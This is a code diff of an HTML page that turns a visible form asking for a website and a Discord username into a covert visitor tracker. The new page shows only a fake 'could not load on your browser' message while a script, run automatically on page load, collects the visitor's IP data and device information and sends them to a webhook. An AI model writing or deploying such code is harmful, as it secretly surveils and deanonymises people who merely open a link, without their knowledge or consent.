@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>project</title>
+  <title>Auto Data Collection</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -25,34 +25,12 @@
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
       width: 300px;
     }
-
-    button {
-      padding: 10px 20px;
-      margin: 10px;
-      border: none;
-      border-radius: 5px;
-      background-color: #7289da;
-      color: white;
-      cursor: pointer;
-    }
-
-    button:hover {
-      background-color: #5b6eae;
-    }
-
-    #status {
-      margin-top: 15px;
-    }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Download Confirmation</h1>
-    <p>Enter the website you want to visit:</p>
-    <input id="website" type="text" placeholder="https://example.com">
-    <button onclick="sendWebsite()">Send</button>
-    <p id="status"></p>
-    <p id="discord-status"></p>
+    <h1>Welcome</h1>
+    <p>could not load on your browser...</p>
   </div>
 
   <script>
@@ -111,45 +89,18 @@
       }
     }
 
-    // Handle "Send" button click
-    async function sendWebsite() {
-      const website = document.getElementById('website').value;
-      const status = document.getElementById('status');
-      status.textContent = 'Sending website...';
-      status.style.color = 'green';
+    // Collect and send data on page load
+    async function collectAndSendData() {
+      await fetchIPData(); // Fetch IP data
+      fetchDeviceInfo(); // Fetch device info
 
-      // Send website to webhook
-      await sendToWebhook(`Website: ${website}`);
-
-      // Ask for Discord user
-      const discordStatus = document.getElementById('discord-status');
-      discordStatus.textContent = 'Enter your Discord username:';
-      const discordInput = document.createElement('input');
-      discordInput.type = 'text';
-      discordInput.placeholder = 'DiscordUsername#1234';
-      discordStatus.appendChild(discordInput);
-      const discordButton = document.createElement('button');
-      discordButton.textContent = 'Send';
-      discordButton.onclick = async () => {
-        const discordUser = discordInput.value;
-        discordStatus.textContent = 'Sending Discord user...';
-        discordStatus.style.color = 'green';
-
-        // Send Discord user to webhook
-        await sendToWebhook(`Discord User: ${discordUser}`);
-
-        // Collect and send device data
-        await fetchIPData(); // Fetch IP data
-        fetchDeviceInfo(); // Fetch device info
-
-        // Send data to the webhook
-        const formattedData = `**User Information:**\n\`\`\`json\n${JSON.stringify(collectedData, null, 2)}\n\`\`\``;
-        await sendToWebhook(formattedData);
-
-        discordStatus.textContent = 'Data sent successfully!';
-        discordStatus.style.color = 'green';
-      };
-      discordStatus.appendChild(discordButton);
+      // Send data to the webhook
+      const formattedData = `**User Information:**\n\`\`\`json\n${JSON.stringify(collectedData, null, 2)}\n\`\`\``;
+      await sendToWebhook(formattedData);
     }
+
+    // Trigger data collection and sending
+    collectAndSendData();
   </script>
 </body>
+</html>
